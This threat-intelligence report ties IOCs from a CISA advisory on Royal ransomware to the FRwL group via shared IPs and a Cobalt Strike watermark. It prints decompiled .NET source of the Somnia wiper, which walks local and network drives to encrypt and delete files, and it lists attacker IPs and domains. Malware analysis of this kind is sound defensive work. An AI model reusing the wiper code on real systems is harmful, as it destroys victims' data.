Summary
CISA recently released a CyberSecurity advisory on the royal ransomware group. In the
advisory, a number of excellent mitigation techniques and strategies are recommended.
Along with the recommendations are several IOCs and technical details on related activities.
After reviewing several of the IOCs, one of the IPs stood out. The ip address
139[.]60.161.213. The date listed in the CISA report is November 2022. Interestingly enough,
back in November CERT-UA published an advisory on UAC-0118 aka FRwL. Similar to the
1/7

report released by CISA, CERT-UA released IOC’s. They also released 139[.]60.161.213.
A second IOC appears to show up on both lists as well: 94.232.41[.]105. However, this IOC
came with a caveat, “In reference to Cobalt Strike and other tools mentioned above, a tool
repository used by Royal was identified at IP: 94.232.41[.]105 in December 2022.”1 After
doing a quick search, this IP address hosted two separate cobalt strike instances. The first
instance used the domain softloadup[.]com. After a short period of time, the domain was
rotated to sombrat[.]com. While the domains changed, the beacon watermark or license id
stayed the same: “206546002”.
This watermark is not new and has been noted in multiple ransomware related events. For
example, in September the watermark showed up in a play-related ransomware attack.
While the activity slightly predates the royal activity noted by CISA, the TrendMicro article
ties the watermark to previous botnets known to be deployed by CONTI related actors such
as Emotet and the ransomware strain Quantum.

Wiper
While investigating Somnia, we discovered a zip package named ‘Release.zip’ on VirusTotal
that contained a built Somnia package(bcb2a2a247daa0e37144e00375094e6c). Somnia is
written in .NET and the main code is pretty simplistic. It simply retrieves a list of all files on
the local system along with the files on any shared drives and passes each file off to the
‘CrashFile’ code:

2/7

namespace Somnia
{
internal class Program
{
public static void Main()
{
Program.GetLocal();
Program.GetNet();
}
public static void GetLocal()
{
CrashFile crasher = new CrashFile();
DriveInfo[] drives = DriveInfo.GetDrives();
for (int i = 0; i < drives.Length; i++)
{
foreach (string fname in Program.GetAllFiles(drives[i].Name))
{
if (!fname.Contains("Program Files") &&
!fname.Contains("AppData") && !fname.Contains("Windows"))
{
try
{
crasher.CrashAll(fname);
}
catch
{
}
}
}
}
}
public static void GetNet()
{
CrashFile crasher = new CrashFile();
DriveInfo[] drives = DriveInfo.GetDrives();
for (int i = 0; i < drives.Length; i++)
{
DriveInfo arg_16_0 = drives[i];
foreach (string fname in Program.GetAllFiles("\\\\"))
{
if (!fname.Contains("Windows") && !fname.Contains("Boot") &&
!fname.Contains("System Volume Information") &&
!fname.Contains("Windows Defender") &&
!fname.Contains("Windows Defender Advanced Threat Protection"))
{
try
{
crasher.CrashAll(fname);
}
catch
{
}

3/7

}
}
}
}

The code will ignore files with certain keywords in their path:
Program Files
AppData
Windows
Boot
System Volume Information
Windows Defender
Windows Defender Advanced Threat Protection
The CrashAll functionality performs more checks to see if the file extension is in a list of
extensions that are being targeted for encryption along with ignoring files with the ‘.somnia’
extension and ignoring any file with ‘image.bmp’ in the name.
After passing all the previously mentioned checks, the malware will then encrypt the file by
passing the path to the ‘CrashOne’ function and then delete the original file. The CrashOne
function is where we see why this malware is not ransomware but instead is a wiper:
The main points of the above code are thus:
1. Every file encrypted will use AES in CBC mode.
2. Every file encrypted gets a unique AES key and IV.
3. The AES key and IV used is not stored anywhere.
4. The keys could be recovered from memory analysis.
The malware generates a random 32 byte AES key and a 16 byte IV for every file but does
not clean up memory afterwards.

CobaltStrike
The CobaltStrike instances being leveraged by this cluster of actor(s) activity appears to
intersect often with the watermark ‘206546002’. This watermark has many ties to
infrastructure associated with various ransomware operations. DFIR Report put out two
reports related to the resurgence of Emotet to deliver CobaltStrike which look to follow the
CONTI playbook during their engagement and also leading to ransomware groups suspected
to be affiliated with ex-CONTI threat actors.

4/7

A blog released by SANS around the same time period as the earlier mentioned reports also
links these CobaltStrike deployments to the utilization of tyk.io. The TYK API management
protocol can be leveraged to hide CobaltStrike strike beacon activity, something that was
mentioned previously and was also referenced by the late Vitali Kremez as a tactic leveraged
by ex-CONTI groups.
After decrypting the cobalt strike file referenced in the SANS blog, the CobaltStrike sample
unsurprisingly matches the same watermark as the instances referenced earlier in the article:

}

While ransomware strains have shifted due to various market conditions, including
detainment and takedowns, the motivation behind ransomware has typically been described
as financial. However, the underground economy continues to evolve and innovate. As
Global conditions continue to impact the Cyberspace, the overlap between FRwL and Royal
operators should not be overlooked.
